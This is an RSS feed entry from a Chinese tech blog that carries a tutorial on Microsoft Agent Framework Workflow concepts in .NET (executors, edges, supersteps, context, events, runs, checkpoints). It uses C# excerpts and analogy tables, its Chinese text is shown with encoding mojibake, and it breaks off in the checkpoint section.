<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-01-20T12:41:09.692Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ .NET+AI | Workflow | æ ¸å¿æ¦å¿µééï¼1ï¼ ]]></title>
    <link>https://www.cnblogs.com/sheng-jie/p/19508743</link>
    <guid>e398a11c18cee981cd7f59282ddf958e</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/sheng-jie/p/19508743" title="åå¸äº 2026-01-20 20:34">
    <span role="heading" aria-level="2">.NET+AI | Workflow | æ ¸å¿æ¦å¿µééï¼1ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="maf-workflow-æ ¸å¿æ¦å¿µè¯¦è§£">MAF Workflow æ ¸å¿æ¦å¿µè¯¦è§£</h1>
<h2 id="-æ¬è¯¾æ¦è§">ð æ¬è¯¾æ¦è§</h2>
<p><strong>Microsoft Agent Framework (MAF)</strong> æä¾äºä¸å¥å¼ºå¤§ç <strong>Workflowï¼å·¥ä½æµï¼</strong> æ¡æ¶ï¼ç¨äºç¼æååè°å¤ä¸ªæºè½ä½ï¼Agentï¼æå¤çç»ä»¶çæ§è¡æµç¨ã</p>
<p>æ¬è¯¾å°ä»¥<strong>éä¿ææ</strong>çæ¹å¼ï¼å¸®å©ä½ çè§£ MAF Workflow çæ ¸å¿æ¦å¿µï¼</p>
<table>
<thead>
<tr>
<th>æ¦å¿µ</th>
<th>è¯´æ</th>
<th>ç±»æ¯</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Workflow</strong></td>
<td>å·¥ä½æµå®ä¹</td>
<td>ð æµç¨å¾</td>
</tr>
<tr>
<td><strong>Executor</strong></td>
<td>æ§è¡å¨/å¤çèç¹</td>
<td>ð§ å·¥äºº</td>
</tr>
<tr>
<td><strong>Edge</strong></td>
<td>è¿æ¥è¾¹</td>
<td>â¡ï¸ ä¼ éå¸¦</td>
</tr>
<tr>
<td><strong>SuperStep</strong></td>
<td>è¶æ­¥/æ¹éå¤ç</td>
<td>â±ï¸ å¤çå¨æ</td>
</tr>
<tr>
<td><strong>WorkflowContext</strong></td>
<td>å·¥ä½æµä¸ä¸æ</td>
<td>ð¦ å·¥ä½å°</td>
</tr>
<tr>
<td><strong>WorkflowEvent</strong></td>
<td>å·¥ä½æµäºä»¶</td>
<td>ð£ éç¥</td>
</tr>
<tr>
<td><strong>Run</strong></td>
<td>è¿è¡å®ä¾</td>
<td>ð ä¸æ¬¡æ§è¡</td>
</tr>
<tr>
<td><strong>Checkpoint</strong></td>
<td>æ£æ¥ç¹</td>
<td>ð¾ å­æ¡£ç¹</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/16fe2c29-9841-49dd-b2ff-803e9abfd3f0.png" alt="" loading="lazy"></p>
<p>è®©æä»¬éä¸æ·±å¥äºè§£è¿äºæ¦å¿µï¼</p>
<h2 id="-ä¸ºä»ä¹éè¦-workflow">ð¯ ä¸ºä»ä¹éè¦ Workflowï¼</h2>
<p>å¨æå»º AI æºè½ä½åºç¨æ¶ï¼æä»¬ç»å¸¸éè¦ï¼</p>
<ol>
<li><strong>å¤æ­¥éª¤å¤ç</strong>ï¼ç¨æ·è¯·æ±éè¦ç»è¿å¤ä¸ªå¤çç¯è</li>
<li><strong>å¤æºè½ä½åä½</strong>ï¼ä¸åç Agent åå¸å¶èï¼ååå®æä»»å¡</li>
<li><strong>æ¡ä»¶åæ¯</strong>ï¼æ ¹æ®å¤çç»æå³å®ä¸ä¸æ­¥èµ°å</li>
<li><strong>å¹¶è¡å¤ç</strong>ï¼æäºä»»å¡å¯ä»¥åæ¶è¿è¡ä»¥æé«æç</li>
<li><strong>ç¶æç®¡ç</strong>ï¼éè¦å¨å¤çè¿ç¨ä¸­ä¿å­åæ¢å¤ç¶æ</li>
</ol>
<p><strong>ä¼ ç»æ¹å¼çé®é¢ï¼</strong></p>
<pre><code class="language-csharp">// â ç¡¬ç¼ç çæµç¨ï¼é¾ä»¥ç»´æ¤åæ©å±
var result1 = await agent1.ProcessAsync(input);
if (result1.Success)
{
    var result2 = await agent2.ProcessAsync(result1.Data);
    // ... è¶æ¥è¶å¤æ
}
</code></pre>
<p><strong>ä½¿ç¨ Workflow çä¼å¿ï¼</strong></p>
<pre><code class="language-csharp">// â å£°æå¼å®ä¹ï¼æ¸æ°å¯ç»´æ¤
var workflow = new WorkflowBuilder(startExecutor)
    .AddEdge(executor1, executor2)
    .AddEdge(executor2, executor3, condition: x =&gt; x.Success)
    .Build();
</code></pre>
<p><img src="https://files.mdnice.com/user/3327/39f9dccf-b55a-4c3d-ac26-aaa65919d7d4.png" alt="" loading="lazy"></p>
<hr>
<h1 id="ä¸æ ¸å¿æ¦å¿µexecutoræ§è¡å¨">ä¸ãæ ¸å¿æ¦å¿µï¼Executorï¼æ§è¡å¨ï¼</h1>
<h2 id="-ä»ä¹æ¯-executor">ð§ ä»ä¹æ¯ Executorï¼</h2>
<p><strong>Executorï¼æ§è¡å¨ï¼</strong> æ¯ Workflow ä¸­ç<strong>æå°å·¥ä½åå</strong>ï¼ç±»ä¼¼äºï¼</p>
<table>
<thead>
<tr>
<th>ç±»æ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð§âð­ å·¥åéçå·¥äºº</td>
<td>æ¯ä¸ªå·¥äººè´è´£ä¸éå·¥åº</td>
</tr>
<tr>
<td>ð§± ä¹é«ç§¯æ¨å</td>
<td>æ¯ä¸ªç§¯æ¨æç¹å®åè½ï¼ç»åææ´ä½</td>
</tr>
<tr>
<td>ð çµè·¯ä¸­çåä»¶</td>
<td>æ¥æ¶è¾å¥ä¿¡å·ï¼è¾åºå¤çç»æ</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/aa65b104-e8de-4b37-aa64-aaa48d6132d5.png" alt="" loading="lazy"></p>
<h2 id="-executor-çæ ¸å¿ç¹å¾">ð Executor çæ ¸å¿ç¹å¾</h2>
<ol>
<li><strong>å¯ä¸æ è¯ï¼Idï¼</strong>ï¼æ¯ä¸ª Executor æä¸ä¸ªå¯ä¸ç IDï¼ç¨äºå¨ Workflow ä¸­å¼ç¨</li>
<li><strong>æ¶æ¯å¤ç</strong>ï¼æ¥æ¶ç¹å®ç±»åçè¾å¥æ¶æ¯ï¼å¤çåäº§çè¾åºæ¶æ¯</li>
<li><strong>è·¯ç±éç½®</strong>ï¼éè¿ <code>ConfigureRoutes</code> æ¹æ³å®ä¹è½å¤çåªäºç±»åçæ¶æ¯</li>
<li><strong>ç¶ææç¥</strong>ï¼å¯ä»¥éè¿ <code>IWorkflowContext</code> è®¿é®åä¿®æ¹å·¥ä½æµç¶æ</li>
</ol>
<h2 id="ï¸-executor-çç±»åå±æ¬¡">ðï¸ Executor çç±»åå±æ¬¡</h2>
<p>MAF æä¾äºå¤ç§ Executor ç±»åï¼æ»¡è¶³ä¸ååºæ¯éæ±ï¼</p>
<table>
<thead>
<tr>
<th>ç±»å</th>
<th>ç¨é</th>
<th>ç¤ºä¾åºæ¯</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Executor&lt;TInput&gt;</code></td>
<td>å¤çæ¶æ¯ï¼æ è¿åå¼</td>
<td>æ¥å¿è®°å½ãéç¥åé</td>
</tr>
<tr>
<td><code>Executor&lt;TInput, TOutput&gt;</code></td>
<td>å¤çæ¶æ¯ï¼æè¿åå¼</td>
<td>æ°æ®è½¬æ¢ãAI è°ç¨</td>
</tr>
<tr>
<td><code>FunctionExecutor&lt;T&gt;</code></td>
<td>ç¨å§æå½æ°å¿«éåå»º</td>
<td>ç®åå¤çé»è¾</td>
</tr>
<tr>
<td><code>StatefulExecutor&lt;TState&gt;</code></td>
<td>éè¦ç»´æ¤ç¶æçæ§è¡å¨</td>
<td>ä¼è¯ç®¡çãè®¡æ°å¨</td>
</tr>
</tbody>
</table>
<h2 id="-executor-æºç è§£æ">ð¡ Executor æºç è§£æ</h2>
<p>ä»æºç ä¸­å¯ä»¥çå° Executor çæ ¸å¿è®¾è®¡ï¼</p>
<pre><code class="language-csharp">// æ¥èª Executor.cs
public abstract class Executor : IIdentified
{
    // å¯ä¸æ è¯ç¬¦
    public string Id { get; }
    
    // éç½®æ¶æ¯è·¯ç±ï¼å­ç±»å¿é¡»å®ç°ï¼
    protected abstract RouteBuilder ConfigureRoutes(RouteBuilder routeBuilder);
    
    // æ§è¡æ¶æ¯å¤ç
    public async ValueTask&lt;object?&gt; ExecuteAsync(
        object message, 
        TypeId messageType, 
        IWorkflowContext context, 
        CancellationToken cancellationToken = default)
    {
        // è®°å½è°ç¨äºä»¶
        await context.AddEventAsync(new ExecutorInvokedEvent(this.Id, message));
        
        // è·¯ç±æ¶æ¯å°æ­£ç¡®çå¤çå¨
        CallResult? result = await this.Router.RouteMessageAsync(message, context, ...);
        
        // è®°å½å®ææå¤±è´¥äºä»¶
        ExecutorEvent executionResult = result?.IsSuccess is not false
            ? new ExecutorCompletedEvent(this.Id, result?.Result)
            : new ExecutorFailedEvent(this.Id, result.Exception);
            
        await context.AddEventAsync(executionResult);
        return result.Result;
    }
}
</code></pre>
<p><strong>å³é®ç¹</strong>ï¼</p>
<ul>
<li>â æ¯ä¸ª Executor æå¯ä¸ ID</li>
<li>â éè¿ <code>ConfigureRoutes</code> å£°æè½å¤ççæ¶æ¯ç±»å</li>
<li>â æ§è¡è¿ç¨ä¼äº§çäºä»¶ï¼<code>ExecutorInvokedEvent</code>ã<code>ExecutorCompletedEvent</code> ç­ï¼</li>
</ul>
<hr>
<h1 id="äºæ ¸å¿æ¦å¿µedgeè¾¹">äºãæ ¸å¿æ¦å¿µï¼Edgeï¼è¾¹ï¼</h1>
<h2 id="ï¸-ä»ä¹æ¯-edge">â¡ï¸ ä»ä¹æ¯ Edgeï¼</h2>
<p><strong>Edgeï¼è¾¹ï¼</strong> æ¯è¿æ¥ä¸¤ä¸ª Executor ç<strong>æ¶æ¯éé</strong>ï¼ç±»ä¼¼äºï¼</p>
<table>
<thead>
<tr>
<th>ç±»æ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð­ å·¥åä¼ éå¸¦</td>
<td>æä¸ä¸éå·¥åºçäº§åä¼ éå°ä¸ä¸éå·¥åº</td>
</tr>
<tr>
<td>ð æ°´ç®¡</td>
<td>ææ°´ä»ä¸ä¸ªå®¹å¨å¼å¯¼å°å¦ä¸ä¸ªå®¹å¨</td>
</tr>
<tr>
<td>ð¨ é®è·¯</td>
<td>æä¿¡ä»¶ä»åä»¶äººéå°æ¶ä»¶äºº</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/bb96f0fb-ff6c-44d8-8186-6943c986f5ce.png" alt="" loading="lazy"></p>
<h2 id="-edge-çä¸ç§ç±»å">ð Edge çä¸ç§ç±»å</h2>
<p>MAF æ¯æä¸ç§ç±»åç Edgeï¼éç¨äºä¸åçæµç¨æ¨¡å¼ï¼</p>
<p><img src="https://files.mdnice.com/user/3327/aaa31c9e-2271-4777-aba4-da9ba0e58382.png" alt="" loading="lazy"></p>
<table>
<thead>
<tr>
<th>ç±»å</th>
<th>è¯´æ</th>
<th>ä½¿ç¨åºæ¯</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Directï¼ç´è¿ï¼</strong></td>
<td>ä¸å¯¹ä¸è¿æ¥</td>
<td>é¡ºåºå¤çæµç¨</td>
</tr>
<tr>
<td><strong>FanOutï¼æåºï¼</strong></td>
<td>ä¸å¯¹å¤è¿æ¥</td>
<td>å¹¶è¡ååä»»å¡</td>
</tr>
<tr>
<td><strong>FanInï¼æå¥ï¼</strong></td>
<td>å¤å¯¹ä¸è¿æ¥</td>
<td>æ±èå¤ä¸ªç»æ</td>
</tr>
</tbody>
</table>
<h2 id="-edge-æºç è§£æ">ð¡ Edge æºç è§£æ</h2>
<p>ä»æºç å¯ä»¥çå° Edge çæ ¸å¿ç»æï¼</p>
<pre><code class="language-csharp">// æ¥èª Edge.cs
public enum EdgeKind
{
    Direct,   // ç´è¿ï¼ä¸å¯¹ä¸
    FanOut,   // æåºï¼ä¸å¯¹å¤
    FanIn     // æå¥ï¼å¤å¯¹ä¸
}

public sealed class Edge
{
    public EdgeKind Kind { get; init; }    // è¾¹çç±»å
    public EdgeData Data { get; init; }    // è¾¹çå·ä½æ°æ®
}

// æ¥èª DirectEdgeData.cs - ç´è¿è¾¹çæ°æ®
public sealed class DirectEdgeData : EdgeData
{
    public string SourceId { get; }        // æº Executor ID
    public string SinkId { get; }          // ç®æ  Executor ID
    public Func&lt;object?, bool&gt;? Condition; // å¯éçæ¡ä»¶å¤æ­
}
</code></pre>
<p><strong>Direct Edge ç¤ºæå¾</strong>ï¼</p>
<p><img src="https://files.mdnice.com/user/3327/aa742609-8a85-4f6c-bc63-2cf3790a3f53.png" alt="" loading="lazy"></p>
<p><strong>å³é®ç¹</strong>ï¼</p>
<ul>
<li>â Edge å®ä¹äºæ¶æ¯ä»åªéæ¥ãå°åªéå»</li>
<li>â Direct Edge æ¯æ<strong>æ¡ä»¶è·¯ç±</strong>ï¼åªææ»¡è¶³æ¡ä»¶çæ¶æ¯æä¼ éï¼</li>
<li>â FanOut Edge å¯ä»¥å®ç°<strong>å¹¿æ­</strong>æ<strong>ååº</strong>é»è¾</li>
</ul>
<hr>
<h1 id="ä¸æ ¸å¿æ¦å¿µworkflowå·¥ä½æµ">ä¸ãæ ¸å¿æ¦å¿µï¼Workflowï¼å·¥ä½æµï¼</h1>
<h2 id="-ä»ä¹æ¯-workflow">ð ä»ä¹æ¯ Workflowï¼</h2>
<p><strong>Workflowï¼å·¥ä½æµï¼</strong> æ¯å°å¤ä¸ª Executor éè¿ Edge è¿æ¥èµ·æ¥ç<strong>å®æ´æµç¨å®ä¹</strong>ï¼ç±»ä¼¼äºï¼</p>
<table>
<thead>
<tr>
<th>ç±»æ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð æµç¨å¾</td>
<td>å®ä¹äºä»å¼å§å°ç»æçå®æ´æµç¨</td>
</tr>
<tr>
<td>ð­ çäº§çº¿</td>
<td>å¤ä¸ªå·¥ä½éè¿ä¼ éå¸¦è¿æ¥æå®æ´çäº§çº¿</td>
</tr>
<tr>
<td>ð¼ ä¹è°±</td>
<td>è§å®äºæ¼å¥çé¡ºåºåèå¥</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/e79021e2-7ba8-4857-8664-d670d74e7d89.png" alt="" loading="lazy"></p>
<h2 id="-workflow-çæ ¸å¿å±æ§">ð Workflow çæ ¸å¿å±æ§</h2>
<p>ä»æºç ä¸­å¯ä»¥çå° Workflow çæ ¸å¿ç»æï¼</p>
<pre><code class="language-csharp">// æ¥èª Workflow.cs
public class Workflow
{
    // èµ·å§ Executor ç ID
    public string StartExecutorId { get; }
    
    // å·¥ä½æµåç§°ï¼å¯éï¼
    public string? Name { get; internal init; }
    
    // å·¥ä½æµæè¿°ï¼å¯éï¼
    public string? Description { get; internal init; }
    
    // Executor ç»å®å­å¸
    internal Dictionary&lt;string, ExecutorBinding&gt; ExecutorBindings { get; init; }
    
    // è¾¹çéåï¼ææºèç¹åç»ï¼
    internal Dictionary&lt;string, HashSet&lt;Edge&gt;&gt; Edges { get; init; }
    
    // è¾åº Executor éå
    internal HashSet&lt;string&gt; OutputExecutors { get; init; }
}
</code></pre>
<h2 id="-ä½¿ç¨-workflowbuilder-æå»ºå·¥ä½æµ">ð¨ ä½¿ç¨ WorkflowBuilder æå»ºå·¥ä½æµ</h2>
<p>MAF éç¨ <strong>å»ºé èæ¨¡å¼ï¼Builder Patternï¼</strong> æ¥æå»º Workflowï¼è¿ä½¿å¾å·¥ä½æµçå®ä¹æ´å ç´è§ï¼</p>
<pre><code class="language-csharp">// åå»ºå·¥ä½æµç¤ºä¾
var workflow = new WorkflowBuilder(startExecutor)  // æå®èµ·ç¹
    .WithName("è®¢åå¤çå·¥ä½æµ")                      // è®¾ç½®åç§°
    .WithDescription("å¤ççµåè®¢åçå®æ´æµç¨")       // è®¾ç½®æè¿°
    .AddEdge(receiveOrder, validateOrder)           // æ·»å è¾¹
    .AddEdge(validateOrder, processPayment, 
             condition: x =&gt; x.IsValid)             // æ¡ä»¶è¾¹
    .AddEdge(processPayment, sendNotification)
    .WithOutputFrom(sendNotification)               // æå®è¾åºèç¹
    .Build();                                       // æå»ºå·¥ä½æµ
</code></pre>
<p><img src="https://files.mdnice.com/user/3327/704eac82-db13-4ba4-beb5-6b9d3c8b30e9.png" alt="" loading="lazy"></p>
<p><strong>å³é®æ¹æ³</strong>ï¼</p>
<table>
<thead>
<tr>
<th>æ¹æ³</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>AddEdge(source, sink)</code></td>
<td>æ·»å ç´è¿è¾¹</td>
</tr>
<tr>
<td><code>AddEdge(..., condition)</code></td>
<td>æ·»å æ¡ä»¶è¾¹</td>
</tr>
<tr>
<td><code>AddFanOut(source, sinks)</code></td>
<td>æ·»å æåºè¾¹</td>
</tr>
<tr>
<td><code>AddFanIn(sources, sink)</code></td>
<td>æ·»å æå¥è¾¹</td>
</tr>
<tr>
<td><code>WithOutputFrom(executor)</code></td>
<td>æå®è¾åºèç¹</td>
</tr>
<tr>
<td><code>BindExecutor(executor)</code></td>
<td>ç»å®å ä½ç¬¦æ§è¡å¨</td>
</tr>
<tr>
<td><code>Build()</code></td>
<td>æå»ºæç»ç Workflow</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="åæ ¸å¿æ¦å¿µsuperstepè¶æ­¥">åãæ ¸å¿æ¦å¿µï¼SuperStepï¼è¶æ­¥ï¼</h1>
<h2 id="ï¸-ä»ä¹æ¯-superstep">â±ï¸ ä»ä¹æ¯ SuperStepï¼</h2>
<p><strong>SuperStepï¼è¶æ­¥ï¼</strong> æ¯ Workflow æ§è¡ç<strong>åºæ¬å¤çå¨æ</strong>ãå¯ä»¥ç±»æ¯ä¸ºï¼</p>
<table>
<thead>
<tr>
<th>ç±»æ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð® æ¸¸æä¸­ç"åå"</td>
<td>æ¯ä¸ªåååææç©å®¶åæ¶è¡å¨</td>
</tr>
<tr>
<td>â° å·¥åç"ç­æ¬¡"</td>
<td>æ¯ä¸ªç­æ¬¡åå®æä¸æ¹ä»»å¡</td>
</tr>
<tr>
<td>ð æµ·æµªç"ä¸æ³¢"</td>
<td>ä¸æ³¢æ¶æ¯è¢«å¤çï¼ç¶åäº§çä¸ä¸æ³¢</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/a29f83ea-1584-4b2b-a7a8-f81be1dd3567.png" alt="" loading="lazy"></p>
<h2 id="-superstep-çæ§è¡æµç¨">ð SuperStep çæ§è¡æµç¨</h2>
<p>æ¯ä¸ª SuperStep åé¨æ§è¡çæ­¥éª¤ï¼</p>
<p><img src="https://files.mdnice.com/user/3327/6147f4a0-86b5-48c7-9401-34ad638867e9.png" alt="" loading="lazy"></p>
<p><strong>å³é®äºä»¶</strong>ï¼</p>
<ul>
<li><code>SuperStepStartedEvent</code>ï¼è¶æ­¥å¼å§</li>
<li><code>SuperStepCompletedEvent</code>ï¼è¶æ­¥å®æ</li>
</ul>
<pre><code class="language-csharp">// SuperStep äºä»¶å®ä¹
public class SuperStepEvent(int stepNumber, object? data = null) : WorkflowEvent(data)
{
    // è¶æ­¥çåºå·ï¼ä» 0 å¼å§ï¼
    public int StepNumber =&gt; stepNumber;
}
</code></pre>
<hr>
<h1 id="äºæ ¸å¿æ¦å¿µworkflowcontextå·¥ä½æµä¸ä¸æ">äºãæ ¸å¿æ¦å¿µï¼WorkflowContextï¼å·¥ä½æµä¸ä¸æï¼</h1>
<h2 id="-ä»ä¹æ¯-workflowcontext">ð¦ ä»ä¹æ¯ WorkflowContextï¼</h2>
<p><strong>WorkflowContextï¼å·¥ä½æµä¸ä¸æï¼</strong> æ¯ Executor æ§è¡æ¶ç<strong>è¿è¡ç¯å¢</strong>ï¼ç±»ä¼¼äºï¼</p>
<table>
<thead>
<tr>
<th>ç±»æ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð ï¸ å·¥äººçå·¥ä½å°</td>
<td>æä¾å·¥å·ãææåéä¿¡æ¸ é</td>
</tr>
<tr>
<td>ð éä¿¡æ¢çº½</td>
<td>åè®¸åä¸ªå·¥ä½ä¹é´ä¼ éä¿¡æ¯</td>
</tr>
<tr>
<td>ð¾ å±äº«åå­</td>
<td>å­å¨åè¯»åç¶ææ°æ®</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/9c0a978e-6470-4199-9bc3-78d4bacd4e8c.png" alt="" loading="lazy"></p>
<h2 id="-iworkflowcontext-æ ¸å¿æ¥å£">ð IWorkflowContext æ ¸å¿æ¥å£</h2>
<pre><code class="language-csharp">// æ¥èª IWorkflowContext.cs
public interface IWorkflowContext
{
    // æ·»å å·¥ä½æµäºä»¶ï¼å¨å½å SuperStep ç»ææ¶è§¦åï¼
    ValueTask AddEventAsync(WorkflowEvent workflowEvent, CancellationToken cancellationToken = default);
    
    // åéæ¶æ¯ç»ä¸æ¸¸ Executorï¼å¨ä¸ä¸ä¸ª SuperStep å¤çï¼
    ValueTask SendMessageAsync(object message, string? targetId, CancellationToken cancellationToken = default);
    
    // è¾åºå·¥ä½æµç»æ
    ValueTask YieldOutputAsync(object output, CancellationToken cancellationToken = default);
    
    // è¯·æ±å¨å½å SuperStep ç»ææ¶åæ­¢å·¥ä½æµ
    ValueTask RequestHaltAsync();
    
    // è¯»åç¶æ
    ValueTask&lt;T?&gt; ReadStateAsync&lt;T&gt;(string key, string? scopeName = null, CancellationToken cancellationToken = default);
    
    // è¯»åæåå§åç¶æ
    ValueTask&lt;T&gt; ReadOrInitStateAsync&lt;T&gt;(string key, Func&lt;T&gt; initialStateFactory, string? scopeName = null, CancellationToken cancellationToken = default);
    
    // æ´æ°ç¶æï¼æéæ´æ°ï¼å¨ SuperStep ç»ææ¶åºç¨ï¼
    ValueTask QueueStateUpdateAsync&lt;T&gt;(string key, T value, string? scopeName = null, CancellationToken cancellationToken = default);
}
</code></pre>
<p><strong>å³é®ç¹</strong>ï¼</p>
<ul>
<li>â <strong>æ¶æ¯ä¼ é</strong>ï¼éè¿ <code>SendMessageAsync</code> å¨ Executor ä¹é´ä¼ éæ¶æ¯</li>
<li>â <strong>ç¶æç®¡ç</strong>ï¼æ¯æè¯»åãåå§ååæ´æ°ç¶æ</li>
<li>â <strong>äºä»¶éç¥</strong>ï¼éè¿ <code>AddEventAsync</code> ååºäºä»¶</li>
<li>â <strong>æµç¨æ§å¶</strong>ï¼éè¿ <code>RequestHaltAsync</code> åæ­¢å·¥ä½æµ</li>
</ul>
<hr>
<h1 id="å­æ ¸å¿æ¦å¿µworkfloweventå·¥ä½æµäºä»¶">å­ãæ ¸å¿æ¦å¿µï¼WorkflowEventï¼å·¥ä½æµäºä»¶ï¼</h1>
<h2 id="-ä»ä¹æ¯-workflowevent">ð£ ä»ä¹æ¯ WorkflowEventï¼</h2>
<p><strong>WorkflowEventï¼å·¥ä½æµäºä»¶ï¼</strong> æ¯å·¥ä½æµæ§è¡è¿ç¨ä¸­äº§çç<strong>éç¥æ¶æ¯</strong>ï¼ç±»ä¼¼äºï¼</p>
<table>
<thead>
<tr>
<th>ç±»æ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð¢ å¹¿æ­éç¥</td>
<td>åææäººå¹¿æ­ç³»ç»ç¶æåå</td>
</tr>
<tr>
<td>ð æ¥å¿è®°å½</td>
<td>è®°å½ç³»ç»æ§è¡è¿ç¨ä¸­çå³é®èç¹</td>
</tr>
<tr>
<td>ð äºä»¶è®¢é</td>
<td>åè®¸å¤é¨çå¬å¹¶ååºç¹å®äºä»¶</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/e0cdfd71-e011-48ff-b3e2-c725c33331a9.png" alt="" loading="lazy"></p>
<h2 id="-äºä»¶åç±»">ð äºä»¶åç±»</h2>
<table>
<thead>
<tr>
<th>äºä»¶å±çº§</th>
<th>äºä»¶ç±»å</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>å·¥ä½æµçº§å«</strong></td>
<td><code>WorkflowStartedEvent</code></td>
<td>å·¥ä½æµå¼å§æ§è¡</td>
</tr>
<tr>
<td></td>
<td><code>WorkflowOutputEvent</code></td>
<td>å·¥ä½æµäº§çè¾åº</td>
</tr>
<tr>
<td></td>
<td><code>WorkflowErrorEvent</code></td>
<td>å·¥ä½æµåçéè¯¯</td>
</tr>
<tr>
<td></td>
<td><code>WorkflowWarningEvent</code></td>
<td>å·¥ä½æµäº§çè­¦å</td>
</tr>
<tr>
<td><strong>è¶æ­¥çº§å«</strong></td>
<td><code>SuperStepStartedEvent</code></td>
<td>è¶æ­¥å¼å§</td>
</tr>
<tr>
<td></td>
<td><code>SuperStepCompletedEvent</code></td>
<td>è¶æ­¥å®æ</td>
</tr>
<tr>
<td><strong>æ§è¡å¨çº§å«</strong></td>
<td><code>ExecutorInvokedEvent</code></td>
<td>Executor è¢«è°ç¨</td>
</tr>
<tr>
<td></td>
<td><code>ExecutorCompletedEvent</code></td>
<td>Executor å®æå¤ç</td>
</tr>
<tr>
<td></td>
<td><code>ExecutorFailedEvent</code></td>
<td>Executor å¤çå¤±è´¥</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="ä¸æ ¸å¿æ¦å¿µrunè¿è¡å®ä¾">ä¸ãæ ¸å¿æ¦å¿µï¼Runï¼è¿è¡å®ä¾ï¼</h1>
<h2 id="-ä»ä¹æ¯-run">ð ä»ä¹æ¯ Runï¼</h2>
<p><strong>Runï¼è¿è¡å®ä¾ï¼</strong> æ¯ Workflow ç<strong>ä¸æ¬¡å·ä½æ§è¡</strong>ï¼ç±»ä¼¼äºï¼</p>
<table>
<thead>
<tr>
<th>ç±»æ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð¬ çµå½±çä¸åºæ¾æ </td>
<td>åä¸é¨çµå½±å¯ä»¥æ¾æ å¤åº</td>
</tr>
<tr>
<td>ð­ çäº§çº¿çä¸ä¸ªæ¹æ¬¡</td>
<td>åä¸æ¡çäº§çº¿å¯ä»¥çäº§å¤ä¸ªæ¹æ¬¡</td>
</tr>
<tr>
<td>ð® æ¸¸æçä¸å±</td>
<td>åä¸ä¸ªæ¸¸æå¯ä»¥ç©å¤å±</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/0001c522-eed9-4bb7-8944-e9154f479dfe.png" alt="" loading="lazy"></p>
<h2 id="-run-çæ ¸å¿ç¹æ§">ð Run çæ ¸å¿ç¹æ§</h2>
<pre><code class="language-csharp">// æ¥èª Run.cs
public sealed class Run : IAsyncDisposable
{
    // è¿è¡å®ä¾çå¯ä¸æ è¯ç¬¦
    public string RunId =&gt; this._runHandle.RunId;
    
    // è·åå½åæ§è¡ç¶æ
    public ValueTask&lt;RunStatus&gt; GetStatusAsync(CancellationToken cancellationToken = default);
    
    // è·åææäº§ççäºä»¶
    public IEnumerable&lt;WorkflowEvent&gt; OutgoingEvents =&gt; this._eventSink;
    
    // è·åèªä¸æ¬¡è®¿é®åçæ°äºä»¶
    public IEnumerable&lt;WorkflowEvent&gt; NewEvents { get; }
    
    // æ¢å¤æ§è¡ï¼å¸¦å¤é¨ååºï¼
    public async ValueTask&lt;bool&gt; ResumeAsync(IEnumerable&lt;ExternalResponse&gt; responses, CancellationToken cancellationToken = default);
}
</code></pre>
<h2 id="-runstatusè¿è¡ç¶æ">ð RunStatusï¼è¿è¡ç¶æï¼</h2>
<pre><code class="language-csharp">public enum RunStatus
{
    NotStarted,      // å°æªå¼å§
    Idle,            // ç©ºé²ï¼å·²æåï¼æ å¾å¤çè¯·æ±ï¼
    PendingRequests, // ç­å¾å¤é¨ååº
    Ended,           // å·²ç»æ
    Running          // æ­£å¨è¿è¡
}
</code></pre>
<p><img src="https://files.mdnice.com/user/3327/9dd5573f-6e86-4d0f-93e1-01666e988f03.png" alt="" loading="lazy"></p>
<hr>
<h1 id="å«æ ¸å¿æ¦å¿µcheckpointæ£æ¥ç¹">å«ãæ ¸å¿æ¦å¿µï¼Checkpointï¼æ£æ¥ç¹ï¼</h1>
<h2 id="-ä»ä¹æ¯-checkpoint">ð¾ ä»ä¹æ¯ Checkpointï¼</h2>
<p><strong>Checkpointï¼æ£æ¥ç¹ï¼</strong> æ¯å·¥ä½æµå¨æä¸ªæ¶å»ç<strong>å®æ´ç¶æå¿«ç§</strong>ï¼ç±»ä¼¼äºï¼</p>
<table>
<thead>
<tr>
<th>ç±»æ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð® æ¸¸æå­æ¡£</td>
<td>ä¿å­æ¸¸æè¿åº¦ï¼éæ¶å¯ä»¥è¯»æ¡£ç»§ç»­</td>
</tr>
<tr>
<td>ð¸ ç§ç</td>
<td>è®°å½æä¸æ¶å»çå®æ´ç¶æ</td>
